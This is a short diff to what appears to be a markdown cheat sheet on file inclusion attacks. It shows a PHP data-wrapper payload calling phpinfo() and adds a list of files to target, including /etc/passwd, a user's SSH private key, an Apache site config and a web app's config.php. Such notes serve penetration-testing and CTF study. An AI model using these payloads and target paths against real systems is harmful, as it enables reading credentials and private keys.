@@ -57,3 +57,13 @@
 ### DATA WRAPPER 
 
 #### data:text/plain,<?php phpinfo(); ?<
+
+## Important files to look for:
+
+#### 1) /etc/passwd
+
+#### 2) /home/USER/.ssh/id_rsa
+
+#### 3) /etc/apache2/sites-enabled/000-default.conf
+
+#### 4) /var/www/html/config.php
